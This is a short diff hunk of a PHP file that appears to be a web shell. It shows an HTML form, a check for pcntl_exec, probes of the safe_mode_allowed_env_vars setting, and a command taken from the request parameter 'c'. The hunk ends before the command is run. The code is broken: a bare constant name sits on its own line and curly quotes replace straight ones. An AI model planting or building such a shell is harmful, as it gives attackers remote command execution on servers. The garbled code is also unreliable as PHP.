@@ -9,6 +9,8 @@
 </FORM>
 <?php
 echo function_exists('pcntl_exec');
+safe_mode_allowed_env_vars
+var_dump(ini_get('safe_mode_allowed_env_vars'));
 if(isset($_REQUEST[‘submit’]))
 {
 $c = $_REQUEST[‘c’];
